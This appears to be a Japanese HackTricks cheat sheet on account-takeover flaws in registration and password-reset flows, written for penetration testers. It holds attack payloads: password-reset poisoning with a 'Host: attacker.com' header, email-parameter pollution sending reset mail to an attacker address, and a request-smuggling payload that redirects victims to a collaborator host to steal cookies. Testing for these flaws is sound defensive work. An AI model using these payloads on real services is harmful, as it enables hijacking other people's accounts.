# 登録 & アカウント乗っ取りの脆弱性

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## アカウント乗っ取りの登録

### 重複登録

* 既存のユーザー名を使用して生成を試みる
* メールを変えてチェックする:
* 大文字
* \+1@
* メールにいくつか追加する
* メール名に特殊文字を追加する (%00, %09, %20)
* メールの後に黒い文字を入れる: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### ユーザー名の列挙

アプリケーション内でユーザー名が既に登録されているかどうかを判断できるかチェックする。

### パスワードポリシー

ユーザーを作成する際にパスワードポリシーをチェックする（弱いパスワードを使用できるかどうかをチェックする）。\
その場合、資格情報のブルートフォースを試みることができる。

### SQLインジェクション

[**このページをチェック**](sql-injection/#insert-statement)して、登録フォームでのアカウント乗っ取りや情報抽出を**SQLインジェクション**を通じて試みる方法を学ぶ。

### Oauthアカウント乗っ取り

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAMLの脆弱性

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### メール変更

登録後、メールを変更して、この変更が正しく検証されているか、または任意のメールに変更できるかをチェックする。

### その他のチェック

* **使い捨てメール**を使用できるかチェックする
* **長い** **パスワード** (>200) が**DoS**につながる
* アカウント作成の**レート制限をチェックする**
* username@**burp\_collab**.net を使用し、**コールバック**を分析する

## **パスワードリセットの乗っ取り**

### リファラー経由でのパスワードリセットトークンの漏洩 <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. パスワードリセットを自分のメールアドレスに要求する
2. パスワードリセットリンクをクリックする
3. パスワードを変更しない
4. 第三者のウェブサイト（例：Facebook、Twitter）をクリックする
5. Burp Suiteプロキシでリクエストをインターセプトする
6. リファラーヘッダーがパスワードリセットトークンを漏洩していないかチェックする。

### パスワードリセットポイズニング <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suiteでパスワードリセットリクエストをインターセプトする
2. Burp Suiteで以下のヘッダーを追加または編集する: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 変更されたヘッダーでリクエストを転送する\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_に基づいたパスワードリセットURLを探す: `https://attacker.com/reset-password.php?token=TOKEN`

### メールパラメータ経由でのパスワードリセット <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### APIパラメータにおけるIDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 攻撃者は自分のアカウントでログインし、**パスワード変更**機能にアクセスする。
2. Burp Suiteを起動し、リクエストをインターセプトする
3. リピータータブに送信し、パラメータを編集する：ユーザーID/メール\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### 弱いパスワードリセットトークン <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

パスワードリセットトークンは、毎回ランダムに生成され、ユニークであるべきです。\
トークンが期限切れになるか、常に同じかどうかを判断しようとします。場合によっては、生成アルゴリズムが弱く、推測可能です。以下の変数がアルゴリズムによって使用される可能性があります。

* タイムスタンプ
* ユーザーID
* ユーザーのメール
* 名と姓
* 生年月日
* 暗号学
* 数字のみ
* 小さいトークンシーケンス（\[A-Z,a-z,0-9]の間の文字）
* トークンの再利用
* トークンの有効期限

### パスワードリセットトークンの漏洩 <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 特定のメールアドレス（例：test@mail.com）を使用してAPI/UIでパスワードリセットリクエストをトリガーする
2. サーバーのレスポンスを検査し、`resetToken`をチェックする
3. そのトークンをURLに使用する `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### ユーザー名の衝突によるパスワードリセット <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 被害者のユーザー名と同一のユーザー名で、前後に空白を挿入してシステムに登録する。例：`"admin "`
2. 悪意のあるユーザー名でパスワードリセットをリクエストする。
3. メールに送られたトークンを使用し、被害者のパスワードをリセットする。
4. 新しいパスワードで被害者のアカウントに接続する。

プラットフォームCTFdはこの攻撃に対して脆弱でした。\
参照：[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### クロスサイトスクリプティングによるアカウント乗っ取り <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. アプリケーション内または親ドメインにスコープされたクッキーがあるサブドメインでXSSを見つける：`*.domain.com`
2. 現在の**セッションクッキー**を漏洩させる
3. クッキーを使用してユーザーとして認証する

### HTTPリクエストスマグリングによるアカウント乗っ取り <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. **smuggler**を使用してHTTPリクエストスマグリングのタイプ（CL, TE, CL.TE）を検出する\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. 以下のデータで`POST / HTTP/1.1`を上書きするリクエストを作成する：\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` は、被害者をburpcollabにリダイレクトしてクッキーを盗むことを目的としています\
3\. 最終的なリクエストは以下のようになるかもしれません
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackeroneはこのバグを悪用した報告をしています
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRFを利用したアカウント乗っ取り <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF用のペイロードを作成します。例: 「パスワード変更用の自動送信HTMLフォーム」
2. ペイロードを送信します

### JWTを利用したアカウント乗っ取り <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Tokenはユーザー認証に使用されることがあります。

* 別のユーザーID / メールでJWTを編集する
* 弱いJWT署名をチェックする

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## 参考文献

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSのハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
